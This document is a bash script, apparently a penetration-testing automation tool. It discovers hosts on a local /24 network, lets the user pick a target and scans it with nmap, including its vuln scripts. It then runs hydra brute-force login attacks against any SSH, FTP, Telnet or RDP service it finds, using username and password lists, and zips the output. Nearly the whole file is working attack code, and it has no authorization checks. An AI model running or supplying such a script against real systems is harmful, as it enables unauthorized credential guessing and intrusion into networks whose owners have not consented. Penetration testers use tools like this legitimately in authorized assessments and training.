#!/bin/bash

services=("SSH" "RDP" "FTP" "TELNET")

# Update and Upgrade System silently
echo "--> Updating system packages. Please wait..."
if sudo apt update &> /dev/null; then
    echo "System packages updated successfully."
else
    echo "Error: Failed to update system packages."
    exit 1
fi

# Upgrade System
echo "--> Upgrading system packages. Please wait..."
if sudo apt upgrade -y &> /dev/null; then
    echo "System packages upgraded successfully."
else
    echo "Error: Failed to upgrade system packages."
    exit 1
fi

echo

# Check for and Install Necessary Tools silently
for tool in nmap hydra zip; do
    if ! command -v $tool &> /dev/null; then
        echo "--> Installing $tool..."
        sudo apt install $tool -y &> /dev/null
        echo "$tool installed successfully."
    else
        echo "$tool is already installed."
    fi
done

echo

# Display available gateways and let the user choose one
echo "Available Gateways:"
IFS=$'\n' read -r -d '' -a gateways < <(route -n | grep 'UG[ \t]' | awk '{print $2}' && printf '\0')
for i in "${!gateways[@]}"; do
    echo "$((i+1))) ${gateways[i]}"
done

while true; do
    echo "Choose the number corresponding to the Gateway you want to use (or type 'exit' to quit):"
    read gateway_choice

    if [[ $gateway_choice == "exit" ]]; then
        echo "Exiting script."
        exit 0
    elif [[ $gateway_choice =~ ^[0-9]+$ ]] && [ $gateway_choice -ge 1 ] && [ $gateway_choice -le ${#gateways[@]} ]; then
        selected_gateway=${gateways[$((gateway_choice-1))]}
        break
    else
        echo "Invalid selection. Available Gateways:"
        for i in "${!gateways[@]}"; do
            echo "$((i+1))) ${gateways[i]}"
        done
        echo "Please choose a valid number from the list."
    fi
done

# Determine network range based on selected gateway
# Assuming a /24 subnet mask, modify if a different subnet mask is used
network_range="${selected_gateway%.*}.0/24"

echo "--> Performing initial host discovery scan on $network_range..."
echo
IFS=$'\n' read -r -d '' -a up_hosts < <(sudo nmap -sn $network_range | grep "Nmap scan report for" | cut -d ' ' -f 5 && printf '\0')
echo "Hosts up in the network range:"
for i in "${!up_hosts[@]}"; do
    echo "$((i+1))) ${up_hosts[i]}"
done

while true; do
    echo "Choose the number corresponding to the IP address you want to scan (or type 'exit' to quit):"
    read choice

    if [[ $choice == "exit" ]]; then
        echo "Exiting script."
        exit 0
    elif [[ $choice =~ ^[0-9]+$ ]] && [ $choice -ge 1 ] && [ $choice -le ${#up_hosts[@]} ]; then
        target_ip=${up_hosts[$((choice-1))]}
        echo "--> Selected IP: $target_ip"
        echo
        break
    else
        echo "Invalid selection. Please choose a valid number from the list."
        for i in "${!up_hosts[@]}"; do
            echo "$((i+1))) ${up_hosts[i]}"
        done
    fi
done

# Set the output directory name to the chosen IP address
output_dir="$target_ip"
mkdir -p "$output_dir"
echo "--> Output directory created: $output_dir"
echo

output_file="$output_dir/scan_results.txt"

# Ask user to choose between default and custom lists
# Function to get custom list path
get_custom_list_path() {
    local list_type=$1
    while true; do
        read -p "Enter the full path to your custom $list_type list: " custom_list_path
        if [ -f "$custom_list_path" ]; then
            echo $custom_list_path
            break
        else
            echo "File does not exist. Please enter a valid path."
        fi
    done
}

echo "Choose the list type for brute force attack:"
echo "1) Use default userlist and passlist"
echo "2) Use custom userlist and passlist"
echo "3) Use default userlist and custom passlist"
echo "4) Use custom userlist and default passlist"

while true; do
    read -p "Enter your choice (1, 2, 3, or 4): " list_choice

    case $list_choice in
        1)
            user_list_path="./lists/userlist.lst"
            pass_list_path="./lists/passlist.lst"
            break
            ;;
        2)
            user_list_path=$(get_custom_list_path "username")
            pass_list_path=$(get_custom_list_path "password")
            break
            ;;
        3)
            user_list_path="./lists/userlist.lst"
            pass_list_path=$(get_custom_list_path "password")
            break
            ;;
        4)
            user_list_path=$(get_custom_list_path "username")
            pass_list_path="./lists/passlist.lst"
            break
            ;;
        *)
            echo "Invalid choice. Please enter 1, 2, 3, or 4."
            ;;
    esac
done

echo "--> User List Path: $user_list_path"
echo "--> Password List Path: $pass_list_path"
echo

while true; do
    echo "Choose the scan type:"
    echo "1) basic"
    echo "2) full"
    read -p "Enter your choice (1 or 2): " scan_choice

    if [ "$scan_choice" == "1" ]; then
        scan_type="basic"
        echo "--> Performing basic scan on $target_ip..."
        sudo nmap -sV $target_ip >> $output_file
        sudo nmap -sU -T4 --version-light --min-rate 1000 --max-retries 1 -n -p U:53,67,68,69,88,123,137,138,161,162,389,500,514,1194,1701,1900,4500,5004,5005,5060,5061 -sV $target_ip >> $output_file
        break
    elif [ "$scan_choice" == "2" ]; then
        scan_type="full"
        echo "--> Performing full scan on $target_ip..."
        sudo nmap -sV --script=vuln -T4 $target_ip >> $output_file
        sudo nmap -sU -T4 --version-light --min-rate 1000 --max-retries 1 -n -p U:53,67,68,69,88,123,137,138,161,162,389,500,514,1194,1701,1900,4500,5004,5005,5060,5061 -sV $target_ip >> $output_file  
        break
    else
        echo "Invalid scan type selected. Please choose 1 or 2."
    fi
done

echo "Scan complete. Results saved to $output_file."
echo

perform_brute_force() {
    local service=$1
    local ip=$2
    local user_list=$3
    local pass_list=$4
    local result_file="${output_dir}/hydra_${service}_results.txt"

    case $service in
        "SSH")
            hydra -t 1 -L $user_list -P $pass_list -o $result_file ssh://$ip &> /dev/null
            ;;
        "FTP")
            hydra -t 1 -L $user_list -P $pass_list -o $result_file ftp://$ip &> /dev/null
            ;;
        "TELNET")
            hydra -t 1 -L $user_list -P $pass_list -o $result_file telnet://$ip &> /dev/null
            ;;
        "RDP")
            hydra -t 1 -L $user_list -P $pass_list -o $result_file rdp://$ip &> /dev/null
            ;;
    esac

    echo "Brute force attack on $service completed. Results saved to $result_file."
    echo
}

# Parse scan_results.txt for Services
for service in "${services[@]}"; do
    if grep -qi "$service" "$output_file"; then
        echo "--> $service service found on $target_ip. Performing brute force attack..."
        perform_brute_force $service $target_ip $user_list_path $pass_list_path
    fi
done

# Creating a zip file from the output directory
zip_file="${output_dir}.zip"
echo "--> Creating a zip file from the output directory..."
zip -r $zip_file $output_dir &> /dev/null

if [ $? -eq 0 ]; then
    echo "Directory successfully compressed into $zip_file"
    
    # Remove the original output directory after zipping
    echo "--> Removing the original output directory..."
    rm -r $output_dir

    if [ $? -eq 0 ]; then
        echo "Original output directory removed successfully."
    else
        echo "There was an error removing the original output directory."
    fi
else
    echo "There was an error creating the zip file."
fi
